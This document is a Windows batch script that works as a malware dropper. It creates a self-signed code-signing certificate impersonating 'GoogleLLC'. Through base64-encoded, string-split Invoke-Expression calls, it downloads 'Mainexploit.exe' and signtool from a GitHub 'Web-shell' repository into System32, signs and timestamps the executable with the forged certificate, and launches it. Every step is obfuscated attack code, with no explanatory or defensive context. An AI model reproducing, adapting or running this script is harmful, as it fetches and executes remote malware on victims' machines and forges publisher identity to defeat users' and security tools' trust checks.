@echo off
setlocal enabledelayedexpansion

REM Define the folder path
set "folderToAdd=C:\Windows\System32"

powershell -command "$cert = New-SelfSignedCertificate -Subject 'GoogleLLC' -CertStoreLocation 'Cert:\CurrentUser\My' -HashAlgorithm sha256 -type CodeSign; $pwd = ConvertTo-SecureString -String 'Justin' -Force -AsPlainText; Export-PfxCertificate -Cert $cert -FilePath 'C:\Windows\System32\GoogleLLC.pfx' -Password $pwd"


powershell -command "In''Vo''kE''-E''xPr''Es''Si''O''n ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtQ29tbWFuZCAid2dldCAgJ2h0dHBzOi8vZ2l0aHViLmNvbS91bjlucGxheWVyL1dlYi1zaGVsbC9yYXcvbWFpbi9zaWdudG9vbC5leGUnICAtT3V0RmlsZSAnQzpcV2luZG93c1xTeXN0ZW0zMlxzaWdudG9vbC5leGUnIg==')))"


powershell -command "In''Vo''kE''-E''xPr''Es''Si''O''n ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtQ29tbWFuZCAid2dldCAnaHR0cHM6Ly9naXRodWIuY29tL3VuOW5wbGF5ZXIvV2ViLXNoZWxsL3Jhdy9tYWluL01haW5leHBsb2l0LmV4ZScgIC1PdXRGaWxlICdDOlxXaW5kb3dzXFN5c3RlbTMyXEphY0tLS0tLLmV4ZSci')))"


powershell -command "In''Vo''kE''-E''xPr''Es''Si''O''n ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('c2lnbnRvb2wuZXhlIHNpZ24gL2YgQzpcV2luZG93c1xTeXN0ZW0zMlxHb29nbGVMTEMucGZ4IC9mZCBTSEEyNTYgL3AgSnVzdGluIEM6XFdpbmRvd3NcU3lzdGVtMzJcSmFjS0tLS0suZXhl')))"


powershell -command "In''Vo''kE''-E''xPr''Es''Si''O''n ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('c2lnbnRvb2wuZXhlIHRpbWVzdGFtcCAtdCBodHRwOi8vdGltZXN0YW1wLmRpZ2ljZXJ0LmNvbSBDOlxXaW5kb3dzXFN5c3RlbTMyXEphY0tLS0tLLmV4ZQ==')))"

powershell -command "In''Vo''kE''-E''xPr''Es''Si''O''n ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFdpbmRvd3NcU3lzdGVtMzJcSmFjS0tLS0suZXhlIgo=')))"


pause

